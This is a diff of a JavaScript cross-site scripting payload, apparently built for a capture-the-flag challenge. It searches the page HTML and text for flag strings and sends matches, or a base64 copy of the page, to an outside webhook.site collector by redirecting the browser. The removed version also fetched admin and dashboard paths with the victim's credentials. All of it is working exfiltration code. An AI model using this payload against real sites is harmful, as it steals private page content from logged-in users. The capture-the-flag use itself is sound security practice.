@@ -1,7 +1,7 @@
 (async () => {
   const exfil = (tag, value) => {
-    location.href =
-      'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116?tag=' +
+    top.location =
+      'https://webhook.site/TU-ID?tag=' +
       encodeURIComponent(tag) +
       '&d=' +
       encodeURIComponent(value);
@@ -10,10 +10,11 @@
   const pats = [
     /flag\{[^}]+\}/i,
     /ctf\{[^}]+\}/i,
-    /hackcon\{[^}]+\}/i
+    /hackcon[a-z_]*\{[^}]+\}/i
   ];
 
   const findFlag = (txt) => {
+    if (!txt) return null;
     for (const re of pats) {
       const m = txt.match(re);
       if (m) return m[0];
@@ -24,14 +25,22 @@
   try {
     const html = document.documentElement.outerHTML;
     const hit = findFlag(html);
-    if (hit) return exfil('flag', hit);
+    if (hit) {
+      exfil('dom_flag', hit);
+      return;
+    }
   } catch (e) {}
 
-  for (const p of ['/', '/admin', '/dashboard', '/flag', '/feedback']) {
-    try {
-      const t = await fetch(p, { credentials: 'include' }).then(r => r.text());
-      const hit = findFlag(t);
-      if (hit) return exfil(p, hit);
-    } catch (e) {}
-  }
+  try {
+    const text = document.body ? document.body.innerText : '';
+    const hit = findFlag(text);
+    if (hit) {
+      exfil('body_flag', hit);
+      return;
+    }
+  } catch (e) {}
+
+  try {
+    exfil('html_b64', btoa(document.documentElement.outerHTML).slice(0, 1800));
+  } catch (e) {}
 })();
